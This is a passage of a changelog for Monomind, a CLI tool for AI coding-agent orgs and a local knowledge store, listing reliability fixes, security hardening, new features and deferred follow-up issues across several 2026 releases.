- **Atomic state writes for org runtime (C4)** — `src/orgrt/daemon.ts` (5 sites). `runtime.json`, `approvals.json`, branch `bus.jsonl`, heartbeat. Direct `writeFileSync(<final-path>, …)` could brick every `org status` / `isOrgRunning` / scheduler call on Ctrl-C during `org stop`. All 5 sites now use `writeJsonFileAtomic()` (tmp + rename).
- **`memory-bridge.ts` surfaces errors instead of swallowing (R1)** — 8 catch sites. SQLITE_BUSY, EACCES, disk-full no longer collapse to "no matches"; logged via new `logBridgeError(label, err)` helper (DEBUG/MONOMIND_DEBUG-gated).
- **`sql.js`-missing fallback no longer fakes a SQLite file (R2)** — `src/memory/memory-initializer.ts:352-405`. Old code wrote a 4 KB "SQLite format 3" header to disk and reported `success:true`; every subsequent read failed and `checkMemoryInitialization` looped forever. Now returns `success:false` with a clear install hint.
- **`busy_timeout:5000` for concurrent SQLite access (R3)** — added to the `@monoes/memory` config. Concurrent MCP server + CLI hook hitting the same `memory.db` no longer silently lose writes to SQLITE_BUSY.
- **Git worktree `execSync` calls carry `timeout:30000` (R4)** — 7 sites in `daemon.ts`. A wedged git hook (git-lfs, gc lock, gpg sign prompt) could previously hang the whole daemon forever.
- **`checkApproval`/`setApproval` serialized per-org (R5)** — Promise-chain mutex fixes the TOCTOU race on `this.approvals` + `approvals.json`.
- **`OrgCheckpoint` schema gains a `version` field (R6)** — `validateCheckpoint` now detects shape changes explicitly instead of silently failing the checksum.
- **`OrgBus.emit` surfaces durable-log append failures (R7)** — emits a follow-up audit event so lost events are attributable in run history instead of DEBUG-only swallow.
- **Latent checkpoint checksum bug fixed** — `generateChecksum` was using `JSON.stringify(state, Object.keys(state).sort())`. Passing an array as the second arg makes it a *whitelist* applied at EVERY nesting level; nested fields like `roleState.boss.tokensUsed` were silently stripped from the canonical form. **`validateCheckpoint` provided ZERO integrity guarantee since the feature shipped.** Fixed with recursive `stableNormalize` + SHA-256 (truncated to 64 bits).
- **Pre-existing ESM hygiene test failure fixed (Q7)** — `daemon.ts:423` had a bare `require('node:child_process')` that vitest's CJS shim masked but the built package threw "require is not defined" in real Node ESM execution.

#### 🚀 Performance

- **Monograph staleness cached per-repo for 30s (P2)** — `src/mcp-tools/monograph-tools.ts`. Cuts a 50–100ms `git rev-list --count` spawn from every `monograph_query` / `_suggest` / `_staleness` / `_health` call.
- **PPR rerank N+1 batched into `WHERE id IN (?, ?, …)` (P3)** — was ~50 round-trips per call, now 2.

#### 📋 Test coverage for previously-untested critical paths

- **`OrgCheckpoint` round-trip (T3, 9 tests)** — capture → validate → tamper → reject for roleState, pendingRoles, version field, TTL expiry, JSON round-trip.
- **`memory-tools` input validation (T1, 11 tests)** — `pattern-search` rejects empty/NUL/ANSI/oversized queries; `pattern-store` rejects empty/NUL keys and NUL values; `feedback` clamps score to [0,1]; `sanitizeError` strips filesystem paths from returned messages.

#### 🏗 Architecture

- **`mcp-tools/types.ts` path helpers extracted to `utils/paths.ts` (A1)** — `getProjectCwd` / `getMonomindDataRoot` / `migrateLegacyStoreFile` moved. Dependency direction is now correct: tool layer consumes path infra, not the reverse.
- **Circular dep broken between `mcp-client.ts` and `monomind-tools.ts` (A2)** — `monomind-tools.ts` now does a dynamic `import()` inside the handler instead of a static cycle.
- **4 orphan workspace packages deleted (A6)** — `@monomind/graph`, `@monomind/security`, `@monoes/monoplaybook`, `plugins/agentic-qe` (only stale build artifacts, no source).

#### ✨ New features & DX

- **`monomind init` emits a runnable sample org (C5)** — new `src/init/write-sample-org.ts`. Every successful `monomind init` writes a schema-valid `.monomind/orgs/sample-team.json` derived from the existing `content-team` template. The README's headline-feature onboarding was previously pointing at a file that didn't exist. Idempotent — never overwrites user edits.
- **Graph staleness surfaced in statusline (V4)** — `src/init/statusline-generator.ts`. Silent staleness was the most dangerous failure mode. Statusline now shows `⊛ <nodes>n <N>behind` with color escalating (green ≤3, gold ≤10, coral >10).
- **Global Documents dashboard section with markdown viewer** — new `📄 Documents` tab under the Global section. Surfaces mastermind-generated markdown across all known projects + the global brain, ordered by date, with a high-fidelity markdown renderer (headings with anchors, bold/italic/strikethrough, inline + fenced code with language label + copy button, unordered/ordered/nested/task lists, GFM tables with per-column alignment, nested blockquotes, horizontal rules, images, links with `rel=noopener`, YAML frontmatter stripping, HTML-escaped at boundary with `<script>`/`on*` handler stripping). Backend: `GET /api/global-docs` + `GET /api/global-doc/read?path=…` with path-traversal protection (403) and `.md`-only enforcement (400).
- **Dead-code cleanup** — deleted `transfer/types.ts` + `transfer/exports/` + dead `anonymization` exports (~740 LOC). Removed `eval-row6-*.json` from repo root and gitignored.
- **Pre-existing test failures fixed** — root-owned `.tmp-audit-test/` directory (leftover from a `sudo` run) was causing all 12 `tests/hive-mind/consensus.test.mjs` AuditWriter tests to fail with EACCES. Removed and gitignored.

#### ⚠️ Behavior changes (with escape hatches)

These changes are technically breaking for users who depended on the old behavior; each has a documented override.

- **`terminal_execute` now requires opt-in.** Set `MONOMIND_ENABLE_TERMINAL=1` or write `.monomind/enable-terminal.json` with `{"enabled":true}` to restore the old default-on behavior.
- **Dashboard + org servers bind to `127.0.0.1` only.** Set `MONOMIND_BROWSE_DASHBOARD_HOST=<host>` or `MONOMIND_ORG_SERVER_HOST=<host>` to bind a specific interface.
- **Crash-reporter redaction is stricter.** Stack traces now show basenames only (no project paths), and IPs/emails/hostnames/SSNs/phones are scrubbed. If you've been debugging crash-reporter output, you'll see less context.
- **`sql.js`-only fallback now fails honestly** instead of silently producing a non-functional DB. Install `sql.js` or `@monoes/memory` to re-enable.

#### 📝 Tracking follow-ups

11 items deferred with explicit rationale, each filed as a GitHub issue labeled [`review-swarm`](https://github.com/monoes/monomind/issues?q=label:review-swarm):

- #62 Delete `production/` dead-code package (v3.0.0 breaking change)
- #63 Curate unrouted agents in `.claude/agents/generated/`
- #64 Split god files (`init/executor.ts`, `monograph-tools.ts`, `OrgDaemon`)
- #65 Consolidate duplicated input-guard helpers
- #66 Add FTS5 to `memory_search` (biggest perf win, cross-package)
- #67 Bound dashboard maps with LRU eviction
- #68 Crash-reporter concurrency tests
- #69 Auto-update `executor`/`validator` tests (security boundary)
- #70 Wire up the dead LSP server + VS Code extension
- #71 Memory browser tab in dashboard
- #72 Real incremental graph updates (multi-day, biggest payoff)

Epic tracking all 11: **[#73](https://github.com/monoes/monomind/issues/73)**.

Full report: `docs/mastermind/reviews/2026-08-05-comprehensive-review-fixes.md`.

---

## [2.8.0] — 2026-07-31

### Antigravity (agy) Support

Monomind now officially supports **Google Antigravity (agy)** alongside Claude Code.

#### What's new

- **`monomind init` generates Antigravity files** — every init run now also creates:
  - `GEMINI.md` — agent instructions and MCP tool rules read by agy
  - `.gemini/rules/monomind.md` — workflow rules file (when to call monograph, memory, knowledge_search)
  - `.gemini/helpers/statusline.sh` — shell wrapper that drives the agy status bar
  - `.gemini/helpers/statusline.cjs` + `utils/` — full Node.js statusline engine (same as Claude Code)
  - `.gemini/settings.json` — wires `statusLine.command` so the status bar appears automatically

- **Status bar in agy** — the Monomind status bar (graph node count, stale nodes, agent routing, git state, session cost) now appears at the bottom of the agy chat window, exactly as it does in Claude Code's terminal UI. No manual setup required after `monomind init`.

- **Global agy settings auto-wired** — `monomind init` also updates `~/.gemini/antigravity-cli/settings.json` and writes `~/.gemini/antigravity-cli/statusline.sh` so the status bar works even before project-level init has run.

- **Org Runtime — multi-LLM providers** — `monomind org run` now supports `gemini` and `openai` provider kinds in org JSON files:
  ```json
  { "provider": { "kind": "gemini", "apiKeyEnv": "GEMINI_API_KEY" } }
  ```
  Org role sessions resolve `GEMINI_API_KEY` / `OPENAI_API_KEY` from the environment without embedding secrets.

- **`isDevRepo` sentinel relaxed** — the `[STALE_HELPERS]` check in `session-restore-handler.cjs` now correctly suppresses auto-heal when running inside the monomind dev repository (only `packages/@monomind/cli/package.json` presence required; no longer also requires the bundled `.claude/helpers` subtree).

## [2.5.0] — 2026-07-18


### Orgs can read your Second Brain
- Org agents get a `knowledge_search` tool: merged semantic search over the project's documents **and** your personal global brain, with the same project-first ranking as every other surface. Role briefings instruct agents to ground work in your actual documents; every lookup is a bus event visible in `org logs` / `org report`.

### Live document ingestion
- The dashboard server (long-lived, warm embedding model) watches the project and ingests changed `md/txt/pdf/docx` in-process within ~5 seconds of a save — no session restart needed. Platforms without recursive watch fall back silently to the session-start reindex.

### Global-brain polish
- Dashboard Second Brain search: project/global/all scope selector, `global` badges, real source-file labels.
- README + the generated per-project CLAUDE.md now teach the cross-project brain (auto-routing, `--store`, `--global`, OKF portability).

## [2.4.0] — 2026-07-18

### Global Second Brain (cross-project)
- One personal knowledge store at `~/.monomind/global-brain` (relocatable via `MONOMIND_GLOBAL_BRAIN_DIR`), structurally exempt from `cleanup --data`.
- **Zero-decision routing:** `doc ingest` on a path outside the current project auto-routes to the global brain (announced, overridable); `--global` forces it; `doc list/export --global`.
- **Merged retrieval everywhere:** `doc search`, the warm `/api/knowledge/search` endpoint, and per-prompt `[SECOND_BRAIN]` injection query project + global; project results win ties, global hits are labeled.
- Memory bridge refactored from a first-caller-wins singleton to a per-store instance cache (also fixes a latent store-misroute); excerpt provenance rides the `src:` ingest tag end-to-end.

## [2.3.x] — 2026-07-18

### 2.3.4 — Swarm-review hardening (round 2)
- Chunker: code-fence awareness (`#` lines in ``` blocks are never headings), CRLF normalization, backward-scan loop guards. (`@monoes/memory@1.0.8`)
- Memory engine: `UNIQUE(namespace,key)` enforced in better-sqlite3 (existing DBs deduped newest-wins), TTL-expired entries excluded from search, streaming row iteration.
- Org runtime: unified boss-selection for `org_complete` gating; `org answer` merges by question id instead of clobbering; `org logs` skips corrupt interior lines; `--run` flag validated; doc-metadata removal via append-only tombstones with compaction.
- Every failed CLI command now prints its failure reason (dispatcher-level fix).

Also in the 2.3.4 cycle: a 49-agent adversarial review of the week's modules confirmed 33 findings — **all 33 fixed**, including a critical `cleanup --data` rule that would have deleted live memory stores, and a silent org message-loss window during session restarts. Ledger: `docs/mastermind/plans/2026-07-18-swarm-review-findings.md`.

### 2.3.3 — Semantic per-prompt knowledge injection
- The dashboard server holds the local embedding model warm and serves `/api/knowledge/search` in ~60ms; every substantive Claude Code prompt gets its top knowledge excerpts injected automatically (`[SECOND_BRAIN]`), with tokenized keyword fallback and visible `(semantic)`/`(keyword)` provenance. Injection telemetry (never prompt text) in `.monomind/metrics/second-brain.jsonl`.

### 2.3.2 — Second Brain foundations
- Heading-aware chunking with `§ section` context prefixes; session-start reindex of changed documents; retrieval golden-set eval grown to 18 cases (80% paraphrase recall bar).
- Org cross-run memory: run outcomes stored per `memory_namespace`, `org_recall` tool for agents.
- `cleanup --data`: provable pruning of orphaned per-project stores via origin markers.
- Doctor: Second Brain model check.

### 2.3.1 — Memory engine replaced (LanceDB removed)
- The memory/Second Brain engine is now local SQLite (better-sqlite3, sql.js WASM fallback) storing text + embedding vectors, with local MiniLM embeddings — **~600MB of native dependencies removed** (`@lancedb/lancedb`, `apache-arrow`, onnx runtime stays for embeddings). (`@monoes/memory@1.0.6`)
- Fixed: semantic search over the native backend returned nothing (empty stub); keyword search required whole-phrase matches; namespace filters leaked across namespaces.
- Retrieval quality became a tested invariant: paraphrase golden-set eval in CI.

### 2.3.0 — Org Runtime v2 capability wave
- **Observability:** `org logs --follow` (live event tail), `org report` (outcome, per-role tokens vs budget, assets, crashes; `--all` for run history).
- **Outcomes + memory:** coordinator records run outcomes via `org_complete`; next run is briefed on the last; history in `<org>/history.jsonl`.
- **Headless HIL:** `org questions` / `org answer` — answer `ask_human` from the terminal, live or queued.
- **Resilience:** crashed agent sessions restart with backoff; crash detection in `org status`.
- **DX:** `org run --dry-run` (role-briefing preview), `org create --template content-team|dev-team|research-pod`, `org validate` (schema + structural invariants), informative `org list`, running-org guards on `stop`/`delete`.

## [2.2.0] — 2026-07-17 and earlier

- Org Runtime v2 (SDK daemon) baseline: per-role live agent sessions, `org_send` message bus, policy-gated tools, dashboard event forwarding, cross-process org discovery.
